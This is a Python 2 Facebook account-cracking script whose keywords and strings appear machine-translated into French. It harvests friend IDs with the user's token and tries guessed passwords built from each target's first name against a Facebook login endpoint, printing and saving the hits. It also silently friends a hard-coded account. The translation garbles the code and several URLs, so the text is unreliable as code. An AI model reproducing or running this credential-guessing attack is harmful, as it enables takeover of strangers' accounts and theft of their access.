
#! / usr / bin / python2
# codage = utf-8


import os, sys, heure, datetime, aléatoire, hashlib, re, threading, json, urllib, cookielib, demandes, mécaniser
à partir de multiprocessing.pool import ThreadPool
from requests.exceptions importation ConnectionError
depuis le navigateur d'importation de mécaniser


recharger (sys)
sys.setdefaultencoding ('utf8')
br = mécaniser.Browser ()
br.set_handle_robots (Faux)
br.set_handle_refresh (mécaniser._http.HTTPRefreshProcessor (), max_time = 1)
br.addheaders = [('User-Agent', 'Opera / 9.80 (Android; Opera Mini / 32.0.2254 / 85. U; id) Presto / 2.12.423 Version / 12.16')]


def keluar ():
	imprimer "\ 033 [1; 96m [!] \ x1b [1; 91mExit"
	os.sys.exit ()


def acak (b):
    w = 'ahtdzjc'
    d = ''
    pour i dans x:
        d + = '!' + w [random.randint (0, len (w) -1)] + i
    retour cetak (d)


def cetak (b):
    w = 'ahtdzjc'
    pour i dans w:
        j = w.index (i)
        x = x.replace ('!% s'% i, '\ 033 [% s; 1m'% str (31 + j))
    x + = '\ 033 [0m'
    x = x.replace ('! 0', '\ 033 [0m')
    sys.stdout.write (x + '\ n')


def jalan (z):
	pour e dans z + '\ n':
		sys.stdout.write (e)
		sys.stdout.flush ()
		time.sleep (00000.1)


#### LOGO ####
logo = "" "

\ 033 [1; 96m °E ° L I S É °
💀═▒═══¤═¤═¤════════════¤═══¤═══¤═══║
\ 033 [1; 96m ║✯ 𝕮𝖗𝖊𝖆𝖙𝖔𝖗 Elisé Fidegnon   ║    
\ 033 [1; 98m ║✯ 𝖄𝖔𝖚𝖙𝖚𝖇𝖊 ☪ Elisé Fidegnon║  
\ 033 [1; 96m ║✯ 𝕴𝖒 𝖓ø𝖙 𝖗𝖊𝖘𝖕𝖔𝖓𝖘𝖎𝖇𝖑𝖊 𝖋𝖔𝖗 𝖆𝖓𝖞 𝖒𝖎𝖘𝖘 𝖚𝖘𝖊 ║
\ 033 [1; 91m ║══▒═💀═▒═💀═▒═══¤═¤═¤════════════¤═══¤═══¤═══ ║ "" "
def tik ():
	titik = ['. ',' .. ',' ... ']
	pour o in titik:
		print ("\ r \ x1b [1; 95m Veuillez patienter \ x1b [1; 95m" + o) ,; sys.stdout.flush (); time.sleep (1)


retour = 0
berhasil = []
cekpoint = []
oks = []
id = []
listgrup = []
vulnot = "\ 033 [31mNon Vuln"
vuln = "\ 033 [32mVuln"

os.system ("clear")
impression """
\ 033 [1; 97m ********************************************** ****
\ 033 [1; 96m ~ JE NE SUIS PAS RESPONSABLE DE TOUTE UTILISATION MANQUÉE M. Elisé Fidegnon ~
\ 033 [1; 97m ********************************************** ****

\ 033 [1; 91m ____ ─▄────────▄█▄───────▄─ Restez à la maison 💓
\ 033 [1; 95m ____ ▐█▌──▄──█████──▄──▐█▌ Restez en sécurité 💓
\ 033 [1; 95m ____ ─█──███▄▄███▄▄███──█─ 
\ 033 [1; 95m ____ °█ ° ° █▄█▄█▀▒▀█▄█▄█ ° °█ ° 
\ 033 [1; 95m ____ ██▄▄█▄█▄█▒▒▒█▄█▄█▄▄██ 
"" "
jalan ("\ 033 [1; 92m _ _ _")             
jalan ("\ 033 [1; 92m | | (_) | |")             
jalan ("\ 033 [1; 92m _ __ __ _ | | ___ ___ | | _ __ _ _ __ HACKERS✔") 
jalan ("\ 033 [1; 97m | '_ \ / _` | | / / / __ | __ / _` |' _ \")
jalan ("\ 033 [1; 97m | | _) | (_ | | <| \ __ \ || (_ | | | | |")
jalan ("\ 033 [1; 92m | .__ / \ __, _ | _ | \ _ \ _ | ___ / \ __ \ __, _ | _ | | _ |")
jalan ("\ 033 [1; 92m | |")                                   
jalan ("\ 033 [1; 92m | _ |")



CorrectUsername = "Yousuf"
CorrectPassword = "Yousuf"
boucle = 'vrai'
while (boucle == 'vrai'):
    username = raw_input ("\ 033 [1; 91m📋 \ x1b [1; 95mTool Username \ x1b [1; 91m» »\ x1b [1; 91m")
    if (username == CorrectUsername):
    	password = raw_input ("\ 033 [1; 91m🗝 \ x1b [1; 95mTool Password \ x1b [1; 91m" »\ x1b [1; 91m")
        if (mot de passe == CorrectPassword):
            print "Connexion réussie en tant que" + nom d'utilisateur #Dev: love_hacker
	    temps de sommeil (2)
            boucle = 'faux'
        autre:
            print "\ 033 [1; 96mWrong Password"
            os.system ('WhatSapp: +22965424731')
    autre:
        print "\ 033 [1; 96mWrong Username"
        os.système ('WhatSapp: +22965424731')

def login ():
	os.system ('effacer')
	essayer:
		toket = open ('login.txt', 'r')
		menu() 
	sauf (KeyError, IOError):
		os.system ('effacer')
		logo imprimé
		imprimer 42 * "\ 033 [1; 96m ="
		print ('\ 033 [1; 96m [⚡] \ x1b [1; 91m───Connectez-vous à votre nouvel identifiant─── \ x1b [1; 93m [⚡]')
		id = raw_input ('\ 033 [1; 93m [+] \ x1b [0; 34mEnter ID / Email \ x1b [1; 95m: \ x1b [1; 95m' ')
		pwd = raw_input ('\ 033 [1; 95m [+] \ x1b [0; 34mEntrez le mot de passe \ x1b [1; 93m: \ x1b [1; 93m' ')
		tik ()
		essayer:
			br.open («https://m.facebook.com»)
		sauf Mechanize.URLError:
			imprimer "\ n \ 033 [1; 96m [!] \ x1b [1; 91mTidak ada koneksi"
			keluar ()
		br._factory.is_html = Vrai
		br.select_form (nr = 0)
		br.form ['email'] = id
		br.form ['pass'] = pwd
		br.submit ()
		url = br.geturl ()
		si 'save-device' dans l'url:
			essayer:
				sig = 'api_key = 882a8490361da98702bf97a021ddc14dcredentials_type = motdepasseemail =' + id + 'format = JSONgenerate_machine_id = 1generate_session_cookies = 1locale = en_USmethod = auth.login9ssa_fac4 = en_USmethod = auth.login9fcfwb =' + pcc23484_sfwb = auth.
				data = {"api_key": "882a8490361da98702bf97a021ddc14d", "credentials_type": "password", "email": id, "format": "JSON", "generate_machine_id": "1", "generate_session_cookies": "1", " locale ":" en_US "," method ":" auth.login "," password ": pwd," return_ssl_resources ":" 0 "," v ":" 1.0 "}
				x = hashlib.new ("md5")
				x.update (sig)
				a = x.hexdigest ()
				data.update ({'sig': a})
				url = "https://api.facebook.com/restserver.php"
				r = demandes.get (url, paramètres = données)
				z = json.loads (r.text)
				unikers = open ("login.txt", 'w')
				unikers.write (z ['access_token'])
				unikers.close ()
				imprimer '\ n \ 033 [1; 96m [✓] \ x1b [1; 92mLogin Hogai' '
				os.system ('xdg-open https://www.youtube.com/channel/UCsdJQbRf0xpvwaDu1rqgJuA')
				demandes.post ('https://graph.facebook.com/me/friends?method=post&uids=gwimusa3&access_token='+z [' access_token '])
				menu()
			sauf demandes.exceptions.ConnectionError:
				imprimer "\ n \ 033 [1; 96m [!] \ x1b [1; 91mTidak ada koneksi"
				keluar ()
		si 'checkpoint' dans l'url:
			print ("\ n \ 033 [1; 96m [!] \ x1b [1; 91mApki Id Checkpoint Par Hai Check Kren Account")
			os.system ('rm -rf login.txt')
			time.sleep (1)
			keluar ()
		autre:
			print ("\ n \ 033 [1; 96m [!] \ x1b [1; 91mPassword / Email ghalat hai")
			os.system ('rm -rf login.txt')
			time.sleep (1)
			s'identifier()


menu def ():
	os.system ('effacer')
	essayer:
		toket = open ('login.txt', 'r'). read ()
	sauf IOError:
		os.system ('effacer')
		print "\ x1b [1; 91m [!] Jeton invalide"
		os.system ('rm -rf login.txt')
		time.sleep (1)
		s'identifier()
	essayer:
		otw = requests.get ('https://graph.facebook.com/me?access_token='+toket)
		a = json.loads (otw.text)
		nama = a ['nom']
		id = a ['id']
		ots = requests.get ('https://graph.facebook.com/me/subscribers?access_token=' + toket)
		b = json.loads (ots.text)
		sub = str (b ['summary'] ['total_count'])
	sauf KeyError:
		os.system ('effacer')
		print "\ 033 [1; 91mVotre compte est au point de contrôle"
		os.system ('rm -rf login.txt')
		time.sleep (1)
		s'identifier()
	sauf demandes.exceptions.ConnectionError:
		print "\ x1b [1; 92mIl n'y a pas de connexion Internet"
		keluar ()
	os.system ("clear")
	logo imprimé
	imprimer "\ 033 [1; 36; 40m ╔═════════════════════════════════╗"
	imprimer "\ 033 [1; 36; 40m ║ \ 033 [1; 32; 40m [*] Nom \ 033 [1; 32; 40m:" + nama + "\ 033 [1; 36; 40m║"                               
	imprimer "\ 033 [1; 36; 40m ║ \ 033 [1; 34; 40m [*] ID \ 033 [1; 34; 40m:" + id + "\ 033 [1; 36; 40m║"
	imprimer "\ 033 [1; 36; 40m ║ \ 033 [1; 34; 40m [*] Subs \ 033 [1; 34; 40m:" + sub + "\ 033 [1; 36; 40m║"
	imprimer "\ 033 [1; 36; 40m ╚═════════════════════════════════╝"
	print "\ 033 [1; 32; 40m [Type1] \ 033 [1; 33; 40m‹ •. • ›Démarrer ♥ Hacking»	
	imprimer "\ 033 [1; 32; 40m [type2] \ 033 [1; 33; 40m‹ •. • ›Mettre à jour»																														
	print "\ 033 [1; 32; 40m [type0] \ 033 [1; 33; 40m‹ •. • ›Déconnexion"
	pilih ()

def pilih ():
	unikers = raw_input ("\ n \ 033 [1; 31; 40m >>> \ 033 [1; 35; 40m")
	si unikers == "":
		imprimer "\ x1b [1; 91mRemplir correctement"
		pilih ()
	elif unikers == "1":
		super()
	elif unikers == "2":
		os.system ('effacer')
		logo imprimé
		imprimer "\ 033 [1; 36; 40m ● ══════════════════◄►══════════════════ ● \ n "
		os.system ('git pull origin master')
		raw_input ('\ n \ x1b [1; 91m [\ x1b [1; 97mBack \ x1b [1; 91m]')
		menu()
	elif unikers == "0":
		jalan ('Jeton supprimé')
		os.system ('rm -rf login.txt')
		keluar ()
	autre:
		imprimer "\ x1b [1; 91mRemplir correctement"
		pilih ()

def super ():
	marché mondial
	os.system ('effacer')
	essayer:
		toket = open ('login.txt', 'r'). read ()
	sauf IOError:
		print "\ x1b [1; 91mToken invalide"
		os.system ('rm -rf login.txt')
		time.sleep (1)
		s'identifier()
	os.system ('effacer')
	logo imprimé
	print "\ 033 [1; 97m- • ◈ • - \ 033 [1; 91m> \ 033 [1; 91m1. \ x1b [1; 95m> _ <Cloner la liste d'amis."
	print "\ 033 [1; 97m- • ◈ • - \ 033 [1; 91m> \ 033 [1; 91m2. \ x1b [1; 95m> _ <Hack Public Accounts."
	print "\ 033 [1; 97m- • ◈ • - \ 033 [1; 91m> \ 033 [1; 91m0. \ 033 [1; 91m> _ <Retour"
	pilih_super ()

def pilih_super ():
	peak = raw_input ("\ n \ 033 [1; 91m ^. ^ Choisissez une option >>> \ 033 [1; 95m")
	si pic == "":
		imprimer "\ x1b [1; 91mRemplir correctement"
		pilih_super ()
	pic elif == "1":
		os.system ('effacer')
		logo imprimé
		imprimer "\ 033 [1; 97m • ◈ • ══════ • ◈ • \ 033 [1; 91mYousuf Alzadjali \ 033 [1; 97m • ◈ • ══════ • ◈ •"
		jalan ('\ 033 [1; 91mGetting IDs \ 033 [1; 91m ...')
		r = requests.get ("https://graph.facebook.com/me/friends?access_token=" + toket)
		z = json.loads (r.text)
		pour s dans z ['data']:
			id.append (s ['id'])
	pic elif == "2":
		os.system ('effacer')
		logo imprimé
		idt = raw_input ("\ 033 [1; 95m [• ◈ •] \ 033 [1; 91mEnter ID \ 033 [1; 95m: \ 033 [1; 95m")
		imprimer "\ 033 [1; 92m • ◈ • ══════ •• ◈ • \ 033 [1; 91mYousufAlzadjali \ 033 [1; 95m • ◈ • ══════ •• ◈ •"
		essayer:
			jok = requests.get ("https://graph.facebook.com/" + idt + "? access_token =" + toket)
			op = json.loads (jok.text)
			print "\ 033 [1; 91mNom \ 033 [1; 95m: \ 033 [1; 95m" + op ["nom"]
		sauf KeyError:
			print "\ x1b [1; 91mID introuvable!"
			raw_input ("\ n \ 033 [1; 95m [\ 033 [1; 91mBack \ 033 [1; 95m]")
			super()
		print "\ 033 [1; 91mGetting IDs \ 033 [1; 97m ..."
		r = requests.get ("https://graph.facebook.com/" + idt + "/ amis? access_token =" + toket)
		z = json.loads (r.text)
		pour i dans z ['data']:
			id.append (i ['id'])
	pic elif == "0":
		menu()
	autre:
		imprimer "\ x1b [1; 91mRemplir correctement"
		pilih_super ()
	
	print "\ 033 [1; 36; 40m [✺] Nombre total d'ID: \ 033 [1; 94m" + str (len (id))
	jalan ('\ 033 [1; 34; 40m [✺] Veuillez patienter ...')
	titik = ['. ',' .. ',' ... ']
	pour o in titik:
		print ("\ r \ 033 [1; 32; 40m [✺] Clonage \ 033 [1; 93m" + o) ,; sys.stdout.flush (); time.sleep (1)
	print "\ n \ 033 [1; 94m ❈ \ x1b [1; 91mPour arrêter le processus appuyez sur CTRL + Z \ 033 [1; 94m ❈"
	imprimer "\ 033 [1; 92m ● ══════════════════◄►══════════════════ ●"

	jalan ('\ 033 [1; 91mYOUSUF démarrer le clonage Attendre ...')
	imprimer "\ 033 [1; 92m ● ══════════════════◄►══════════════════ ●" 

	def main (arg):
		cekpoint global, oks
		utilisateur = arg
		essayer:
			os.mkdir ('out')
		sauf OSError:
			passer #Dev: rana
		essayer:
			a = requests.get ('https://graph.facebook.com/'+user+'/?access_token='+toket)												
			b = json.loads (a.text)												
			pass1 = b ['first_name'] + '1234'												
			data = urllib.urlopen ("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email_FR =" & mot_de_personnel = " ) + "& sdk = ios & generate_session_cookies = 1 & sig = 3f555f99fb61fcd7aa0c44f58f522ef6")												
			q = json.load (données)												
			si 'access_token' dans q:
				x = requests.get ("https://graph.facebook.com/" + utilisateur + "? access_token =" + q ['access_token'])
				z = json.loads (x.text)
				imprimer '\ x1b [1; 94m [✓] \ x1b [1; 92mHack100% 💉' '											
				print '\ x1b [1; 94m [• ⚔ •] \ x1b [1; 91mNom \ x1b [1; 91m ✯ \ x1b [1; 92m' + b ['nom']											
				print '\ x1b [1; 94m [• ⚔ •] \ x1b [1; 91mID \ x1b [1; 91m ✯ \ x1b [1; 92m' + utilisateur											
				print '\ x1b [1; 94m [• ⚔ •] \ x1b [1; 91mMot de passe \ x1b [1; 91m✯ \ x1b [1; 92m' + passe1 + '\ n'											
				oks.append (utilisateur + pass1)
                       autre:
			        si 'www.facebook.com' dans q ["error_msg"]:
				    imprimer '\ x1b [1; 94m [❥] \ x1b [1; 94mPoint de contrôle' '
				    print '\ x1b [1; 94m [• ⚔ •] \ x1b [1; 94mNom \ x1b [1; 94m ✯ \ x1b [1; 95m' + b ['nom']
				    print '\ x1b [1; 94m [• ⚔ •] \ x1b [1; 94mID \ x1b [1; 94m ✯ \ x1b [1; 95m' + utilisateur
				    print '\ x1b [1; 94m [• ⚔ •] \ x1b [1; 94mMot de passe \ x1b [1; 94m✯ \ x1b [1; 95m' + passe1 + '\ n'
				    cek = open ("out / super_cp.txt", "a")
				    cek.write ("ID:" + utilisateur + "Pw:" + pass1 + "\ n")
				    cek.close ()
				    cekpoint.append (utilisateur + pass1)
                                autre:
				    pass2 = b ['first_name'] + '123'										
                                    data = urllib.urlopen ("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email_FR =" & utilisateur + mot de passe = 2 " ) + "& sdk = ios & generate_session_cookies = 1 & sig = 3f555f99fb61fcd7aa0c44f58f522ef6")												
			            q = json.load (données)												
			            si 'access_token' dans q:	
				            x = requests.get ("https://graph.facebook.com/" + utilisateur + "? access_token =" + q ['access_token'])
				            z = json.loads (x.text)
				            imprimer '\ x1b [1; 94m [✓] \ x1b [1; 92mHack100% 💉' '											
				            print '\ x1b [1; 94m [• ⚔ •] \ x1b [1; 91mNom \ x1b [1; 91m ✯ \ x1b [1; 92m' + b ['nom']											
				            print '\ x1b [1; 94m [• ⚔ •] \ x1b [1; 91mID \ x1b [1; 91m ✯ \ x1b [1; 92m' + utilisateur								
				            print '\ x1b [1; 94m [• ⚔ •] \ x1b [1; 91mMot de passe \ x1b [1; 91m✯ \ x1b [1; 92m' + passe2 + '\ n'											
				            oks.append (utilisateur + pass2)
                                    autre:
			                   si 'www.facebook.com' dans q ["error_msg"]:
				               imprimer '\ x1b [1; 94m [❥] \ x1b [1; 94mPoint de contrôle' '
				               print '\ x1b [1; 94m [• ⚔ •] \ x1b [1; 94mNom \ x1b [1; 94m ✯ \ x1b [1; 95m' + b ['nom']
				               print '\ x1b [1; 94m [• ⚔ •] \ x1b [1; 94mID \ x1b [1; 94m ✯ \ x1b [1; 95m' + utilisateur
				               print '\ x1b [1; 94m [• ⚔ •] \ x1b [1; 94mMot de passe \ x1b [1; 94m✯ \ x1b [1; 95m' + passe2 + '\ n'
				               cek = open ("out / super_cp.txt", "a")
				               cek.write ("ID:" + utilisateur + "Pw:" + pass2 + "\ n")
				               cek.close ()
				               cekpoint.append (utilisateur + pass2)								
				           autre:											
					       pass3 = b ['nom_nom'] + '123'										
					       data = urllib.urlopen ("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email_FR =" & user_FR " ) + "& sdk = ios & generate_session_cookies = 1 & sig = 3f555f99fb61fcd7aa0c44f58f522ef6")										
					       q = json.load (données)										
					       si 'access_token' dans q:	
						       x = requests.get ("https://graph.facebook.com/" + utilisateur + "? access_token =" + q ['access_token'])
				                       z = json.loads (x.text)
						       imprimer '\ x1b [1; 94m [✓] \ x1b [1; 92mHack100% 💉' '								
						       print '\ x1b [1; 94m [• ⚔ •] \ x1b [1; 91mNom \ x1b [1; 91m ✯ \ x1b [1; 92m' + b ['nom']									
						       print '\ x1b [1; 94m [• ⚔ •] \ x1b [1; 91mID \ x1b [1; 91m ✯ \ x1b [1; 92m' + utilisateur							
						       print '\ x1b [1; 94m [• ⚔ •] \ x1b [1; 91mMot de passe \ x1b [1; 91m✯ \ x1b [1; 92m' + passe3 + '\ n'									
						       oks.append (utilisateur + pass3)
                                               autre:
			                               si 'www.facebook.com' dans q ["error_msg"]:
				                           imprimer '\ x1b [1; 94m [❥] \ x1b [1; 94mPoint de contrôle' '
				                           print '\ x1b [1; 94m [• ⚔ •] \ x1b [1; 94mNom \ x1b [1; 94m ✯ \ x1b [1; 95m' + b ['nom']
				                           print '\ x1b [1; 94m [• ⚔ •] \ x1b [1; 94mID \ x1b [1; 94m ✯ \ x1b [1; 95m' + utilisateur
				                           print '\ x1b [1; 94m [• ⚔ •] \ x1b [1; 94mMot de passe \ x1b [1; 94m✯ \ x1b [1; 95m' + passe3 + '\ n'
				                           cek = open ("out / super_cp.txt", "a")
				                           cek.write ("ID:" + utilisateur + "Pw:" + pass3 + "\ n")
				                           cek.close ()
				                           cekpoint.append (utilisateur + pass3)							      
					               autre:										
						           pass4 = b ['first_name'] + '123'											
			                                   data = urllib.urlopen ("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email_FR =" & mot_de_personnel = " ) + "& sdk = ios & generate_session_cookies = 1 & sig = 3f555f99fb61fcd7aa0c44f58f522ef6")												
			                                   q = json.load (données)												
			                                   si 'access_token' dans q:		
						                   x = requests.get ("https://graph.facebook.com/" + utilisateur + "? access_token =" + q ['access_token'])
				                                   z = json.loads (x.text)
				                                   imprimer '\ x1b [1; 94m [✓] \ x1b [1; 92mHack100% 💉' '											
				                                   print '\ x1b [1; 94m [• ⚔ •] \ x1b [1; 91mNom \ x1b [1; 91m ✯ \ x1b [1; 92m' + b ['nom']											
				                                   print '\ x1b [1; 94m [• ⚔ •] \ x1b [1; 91mID \ x1b [1; 91m ✯ \ x1b [1; 92m' + utilisateur											
				                                   print '\ x1b [1; 94m [• ⚔ •] \ x1b [1; 91mMot de passe \ x1b [1; 91m✯ \ x1b [1; 92m' + passe4 + '\ n'											
				                                   oks.append (utilisateur + pass4)
                                                           autre:
			                                           si 'www.facebook.com' dans q ["error_msg"]:
				                                       imprimer '\ x1b [1; 94m [❥] \ x1b [1; 94mPoint de contrôle' '
				                                       print '\ x1b [1; 94m [• ⚔ •] \ x1b [1; 94mNom \ x1b [1; 94m ✯ \ x1b [1; 95m' + b ['nom']
				                                       print '\ x1b [1; 94m [• ⚔ •] \ x1b [1; 94mID \ x1b [1; 94m ✯ \ x1b [1; 95m' + utilisateur
				                                       print '\ x1b [1; 94m [• ⚔ •] \ x1b [1; 94mMot de passe \ x1b [1; 94m✯ \ x1b [1; 95m' + passe4 + '\ n'
				                                       cek = open ("out / super_cp.txt", "a")
				                                       cek.write ("ID:" + utilisateur + "Pw:" + pass4 + "\ n")
				                                       cek.close ()
				                                       cekpoint.append (utilisateur + pass4)					
					                           autre:									
						                       pass5 = '786786'							
						                       data = urllib.urlopen ("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email_FR =" & utilisateur + mot de passe = 5 " ) + "& sdk = ios & generate_session_cookies = 1 & sig = 3f555f99fb61fcd7aa0c44f58f522ef6")								
						                       q = json.load (données)								
						                       si 'access_token' dans q:	
						                               x = requests.get ("https://graph.facebook.com/" + utilisateur + "? access_token =" + q ['access_token'])
				                                               z = json.loads (x.text)
						                               imprimer '\ x1b [1; 94m [✓] \ x1b [1; 92mHack100% 💉' '						
						                               print '\ x1b [1; 94m [• ⚔ •] \ x1b [1; 91mNom \ x1b [1; 91m ✯ \ x1b [1; 92m' + b ['nom']							
						                               print '\ x1b [1; 94m [• ⚔ •] \ x1b [1; 91mID \ x1b [1; 91m ✯ \ x1b [1; 92m' + utilisateur					
						                               print '\ x1b [1; 94m [• ⚔ •] \ x1b [1; 91mMot de passe \ x1b [1; 91m✯ \ x1b [1; 92m' + passe5 + '\ n'							
						                               oks.append (utilisateur + pass5)	
                                                                       autre:
			                                                       si 'www.facebook.com' dans q ["error_msg"]:
				                                                   imprimer '\ x1b [1; 94m [❥] \ x1b [1; 94mPoint de contrôle' '
				                                                   print '\ x1b [1; 94m [• ⚔ •] \ x1b [1; 94mNom \ x1b [1; 94m ✯ \ x1b [1; 95m' + b ['nom']
				                                                   print '\ x1b [1; 94m [• ⚔ •] \ x1b [1; 94mID \ x1b [1; 94m ✯ \ x1b [1; 95m' + utilisateur
				                                                   print '\ x1b [1; 94m [• ⚔ •] \ x1b [1; 94mMot de passe \ x1b [1; 94m✯ \ x1b [1; 95m' + passe5 + '\ n'
				                                                   cek = open ("out / super_cp.txt", "a")
				                                                   cek.write ("ID:" + utilisateur + "Pw:" + pass5 + "\ n")
				                                                   cek.close ()
				                                                   cekpoint.append (utilisateur + pass5)					
						                               autre:								
							                           pass6 = 'Pakistan'											
			                                                           data = urllib.urlopen ("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email_FR =" & utilisateur + mot de passe = 6 " ) + "& sdk = ios & generate_session_cookies = 1 & sig = 3f555f99fb61fcd7aa0c44f58f522ef6")												
			                                                           q = json.load (données)												
			                                                           si 'access_token' dans q:	
								                           x = requests.get ("https://graph.facebook.com/" + utilisateur + "? access_token =" + q ['access_token'])
				                                                           z = json.loads (x.text)
				                                                           imprimer '\ x1b [1; 94m [✓] \ x1b [1; 92mHack100% 💉' '											
				                                                           print '\ x1b [1; 94m [• ⚔ •] \ x1b [1; 91mNom \ x1b [1; 91m ✯ \ x1b [1; 92m' + b ['nom']											
				                                                           print '\ x1b [1; 94m [• ⚔ •] \ x1b [1; 91mID \ x1b [1; 91m ✯ \ x1b [1; 92m' + utilisateur									
				                                                           print '\ x1b [1; 94m [• ⚔ •] \ x1b [1; 91mMot de passe \ x1b [1; 91m✯ \ x1b [1; 92m' + passe6 + '\ n'											
				                                                           oks.append (utilisateur + pass6)
                                                                                   autre:
			                                                                   si 'www.facebook.com' dans q ["error_msg"]:
				                                                               imprimer '\ x1b [1; 94m [❥] \ x1b [1; 94mPoint de contrôle' '
				                                                               print '\ x1b [1; 94m [• ⚔ •] \ x1b [1; 94mNom \ x1b [1; 94m ✯ \ x1b [1; 95m' + b ['nom']
				                                                               print '\ x1b [1; 94m [• ⚔ •] \ x1b [1; 94mID \ x1b [1; 94m ✯ \ x1b [1; 95m' + utilisateur
				                                                               print '\ x1b [1; 94m [• ⚔ •] \ x1b [1; 94mMot de passe \ x1b [1; 94m✯ \ x1b [1; 95m' + passe6 + '\ n'
				                                                               cek = open ("out / super_cp.txt", "a")
				                                                               cek.write ("ID:" + utilisateur + "Pw:" + pass6 + "\ n")
				                                                               cek.close ()
				                                                               cekpoint.append (utilisateur + pass6)	
						                                           autre:							
								                               pass7 = b ['first_name'] + '12345'						
								                               data = urllib.urlopen ("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email_FR =" & utilisateur + mot_de_passe = 2 " ) + "& sdk = ios & generate_session_cookies = 1 & sig = 3f555f99fb61fcd7aa0c44f58f522ef6")						
								                               q = json.load (données)						
								                               si 'access_token' dans q:		
				                                                                       x = requests.get ("https://graph.facebook.com/" + utilisateur + "? access_token =" + q ['access_token'])
				                                                                       z = json.loads (x.text)
									                               imprimer '\ x1b [1; 94m [✓] \ x1b [1; 92mHack100% 💉' '					
									                               print '\ x1b [1; 94m [• ⚔ •] \ x1b [1; 91mNom \ x1b [1; 91m ✯ \ x1b [1; 92m' + b ['nom']					
									                               print '\ x1b [1; 94m [• ⚔ •] \ x1b [1; 91mID \ x1b [1; 91m ✯ \ x1b [1; 92m' + utilisateur				
									                               print '\ x1b [1; 94m [• ⚔ •] \ x1b [1; 91mMot de passe \ x1b [1; 91m✯ \ x1b [1; 92m' + passe7 + '\ n'					
									                               oks.append (utilisateur + pass7)
                                                                                               autre:
			                                                                               si 'www.facebook.com' dans q ["error_msg"]:
				                                                                           imprimer '\ x1b [1; 94m [❥] \ x1b [1; 94mPoint de contrôle' '
				                                                                           print '\ x1b [1; 94m [• ⚔ •] \ x1b [1; 94mNom \ x1b [1; 94m ✯ \ x1b [1; 95m' + b ['nom']
				                                                                           print '\ x1b [1; 94m [• ⚔ •] \ x1b [1; 94mID \ x1b [1; 94m ✯ \ x1b [1; 95m' + utilisateur
				                                                                           print '\ x1b [1; 94m [• ⚔ •] \ x1b [1; 94mMot de passe \ x1b [1; 94m✯ \ x1b [1; 95m' + passe7 + '\ n'
				                                                                           cek = open ("out / super_cp.txt", "a")
				                                                                           cek.write ("ID:" + utilisateur + "Pw:" + pass7 + "\ n")
				                                                                           cek.close ()
				                                                                           cekpoint.append (utilisateur + pass7)           					
								                                       autre:						
										                           pass8 = b ['nom_nom'] + '786'											
			                                                                                   data = urllib.urlopen ("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email_FR =" & user + password = " ) + "& sdk = ios & generate_session_cookies = 1 & sig = 3f555f99fb61fcd7aa0c44f58f522ef6")												
			                                                                                   q = json.load (données)												
			                                                                                   si 'access_token' dans q:		
										                                   x = requests.get ("https://graph.facebook.com/" + utilisateur + "? access_token =" + q ['access_token'])
				                                                                                   z = json.loads (x.text)
				                                                                                   imprimer '\ x1b [1; 94m [✓] \ x1b [1; 92mHack100% 💉' '											
				                                                                                   print '\ x1b [1; 94m [• ⚔ •] \ x1b [1; 91mNom \ x1b [1; 91m ✯ \ x1b [1; 92m' + b ['nom']											
				                                                                                   print '\ x1b [1; 94m [• ⚔ •] \ x1b [1; 91mID \ x1b [1; 91m ✯ \ x1b [1; 92m' + utilisateur										
				                                                                                   print '\ x1b [1; 94m [• ⚔ •] \ x1b [1; 91mMot de passe \ x1b [1; 91m✯ \ x1b [1; 92m' + passe8 + '\ n'											
				                                                                                   oks.append (utilisateur + pass8)
                                                                                                           autre:
			                                                                                           si 'www.facebook.com' dans q ["error_msg"]:
				                                                                                       imprimer '\ x1b [1; 94m [❥] \ x1b [1; 94mPoint de contrôle' '
				                                                                                       print '\ x1b [1; 94m [• ⚔ •] \ x1b [1; 94mNom \ x1b [1; 94m ✯ \ x1b [1; 95m' + b ['nom']
				                                                                                       print '\ x1b [1; 94m [• ⚔ •] \ x1b [1; 94mID \ x1b [1; 94m ✯ \ x1b [1; 95m' + utilisateur
				                                                                                       print '\ x1b [1; 94m [• ⚔ •] \ x1b [1; 94mMot de passe \ x1b [1; 94m✯ \ x1b [1; 95m' + passe8 + '\ n'
				                                                                                       cek = open ("out / super_cp.txt", "a")
				                                                                                       cek.write ("ID:" + utilisateur + "Pw:" + pass8 + "\ n")
				                                                                                       cek.close ()
				                                                                                       cekpoint.append (utilisateur + pass8)   	
										                                   autre:					
										                                       pass9 = b ['first_name'] + '786'					
										                                       data = urllib.urlopen ("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email_FR =" & utilisateur + mot de passe = 9 " ) + "& sdk = ios & generate_session_cookies = 1 & sig = 3f555f99fb61fcd7aa0c44f58f522ef6")				
										                                       q = json.load (données)				
										                                       si 'access_token' dans q:		
		                                                                                                               x = requests.get ("https://graph.facebook.com/" + utilisateur + "? access_token =" + q ['access_token'])
				                                                                                               z = json.loads (x.text)
											                                       imprimer '\ x1b [1; 94m [✓] \ x1b [1; 92mHack100% 💉' '			
											                                       print '\ x1b [1; 94m [• ⚔ •] \ x1b [1; 91mNom \ x1b [1; 91m ✯ \ x1b [1; 92m' + b ['nom']			
											                                       print '\ x1b [1; 94m [• ⚔ •] \ x1b [1; 91mID \ x1b [1; 91m ✯ \ x1b [1; 92m' + utilisateur	
											                                       print '\ x1b [1; 94m [• ⚔ •] \ x1b [1; 91mMot de passe \ x1b [1; 91m✯ \ x1b [1; 92m' + passe9 + '\ n'			
											                                       oks.append (utilisateur + pass9)
                                                                                                                       autre:
